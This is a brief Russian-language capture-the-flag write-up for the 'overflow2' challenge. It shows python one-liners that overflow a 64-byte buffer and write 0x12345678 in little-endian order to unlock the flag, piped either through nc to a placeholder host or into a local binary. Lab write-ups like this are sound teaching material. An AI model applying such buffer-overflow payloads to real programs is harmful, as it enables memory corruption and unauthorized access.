# overflow2 — writeup

## Идея
Как в `overflow1`, но для выдачи флага требуется точное значение:

```c
if (is_root == 0x12345678) -> flag
```

Значение надо записать в little-endian.

## Эксплуатация
Переполняем 64-байтовый буфер и дописываем 4 байта `0x12345678` как `78 56 34 12`.

```bash
python3 - <<'PY' | nc <host> <port>
import sys, struct
sys.stdout.buffer.write(b'A'*64 + struct.pack('<I', 0x12345678) + b'\n')
PY
```

Локально:

```bash
python3 - <<'PY' | ./overflow2
import sys, struct
sys.stdout.buffer.write(b'A'*64 + struct.pack('<I', 0x12345678) + b'\n')
PY
```
